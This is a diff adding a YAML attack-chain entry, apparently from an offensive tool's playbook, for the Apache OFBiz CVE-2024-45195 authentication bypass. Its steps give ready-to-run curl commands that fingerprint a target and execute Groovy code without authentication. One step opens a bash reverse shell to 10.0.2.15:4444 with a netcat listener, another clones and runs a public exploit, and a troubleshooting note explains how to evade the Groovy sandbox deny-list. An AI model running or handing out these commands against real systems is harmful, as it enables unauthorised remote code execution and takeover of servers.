@@ -1,0 +1,73 @@
+chain_id: ofbiz_cve_2024_45195
+title: "Apache OFBiz — CVE-2024-45195 view-override auth bypass → unauth RCE"
+severity: CRITICAL
+tags: [ofbiz, apache, cve-2024-45195, auth-bypass, rce, unauth, groovy]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-45195" }
+    - { product_pattern: "(?i)ofbiz" }
+    - { banner_pattern: "(?i)apache ofbiz" }
+    - { port_in: [443, 8443], path_pattern: "(?i)/(webtools|accounting|partymgr)/control" }
+
+description: |
+  OFBiz 18.12.x before 18.12.16 still let the request controller
+  resolve a view name from the URL even when the matching screen
+  required authentication, then pass `groovyProgram` from the
+  query string straight to `GroovyShell.evaluate`. Result:
+  unauthenticated remote Groovy execution. Same root cause as the
+  earlier CVE-2023-49070 / 51467 / 2024-32113 / 2024-38856 chain
+  that Apache patched four times before sealing it here.
+
+steps:
+  - id: 1
+    title: "Fingerprint OFBiz"
+    command: |
+      curl -sk -I "https://$VICTIMA/webtools/control/main" | grep -i 'ofbiz'
+      curl -sk "https://$VICTIMA/accounting/control/main" -o /dev/null -w '%{http_code}\\n'
+
+  - id: 2
+    title: "Confirm the auth-bypass path is exposed"
+    command: |
+      # ViewHandlerExceptionHack — main → ProgramExport via the override.
+      curl -sk "https://$VICTIMA/webtools/control/ViewFactoryService/ProgramExport" -I
+
+  - id: 3
+    title: "Run id via groovyProgram"
+    command: |
+      curl -sk -X POST "https://$VICTIMA/webtools/control/ViewFactoryService/ProgramExport" \
+        --data-urlencode 'groovyProgram=throw new Exception("id".execute().text)' \
+        | grep -i 'exception\\|uid'
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      PAY='throw new Exception(["bash","-c","bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"].execute().text)'
+      curl -sk -X POST "https://$VICTIMA/webtools/control/ViewFactoryService/ProgramExport" \
+        --data-urlencode "groovyProgram=$PAY"
+      nc -lvnp 4444
+
+  - id: 5
+    title: "Public PoC if you want a tidier wrapper"
+    command: |
+      git clone https://github.com/K3ysTr0K3R/CVE-2024-45195-EXPLOIT /tmp/of45195
+      python3 /tmp/of45195/exploit.py -u https://$VICTIMA -c 'id; uname -a'
+
+common_errors:
+  - error: "endpoint returns 403"
+    solution: |
+      Operator deployed the official mitigation
+      (`<security https="true"/>` + `requireAuth=true` on every
+      view). 18.12.16+ ships that posture by default. Check the
+      fix string in the response body: "view requires authenticated
+      access" → patched.
+  - error: "Groovy returns 'class not found' for `Runtime`"
+    solution: |
+      OFBiz Groovy sandbox is partially active in 18.12.13+. Use
+      the `["bash","-c","..."].execute()` shape above instead of
+      `Runtime.getRuntime().exec(...)`; the array form bypasses
+      the deny-list.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-45195
+  - https://lists.apache.org/thread/g7v17lrnq4odo3y66bvnwpvzr6trvdtj
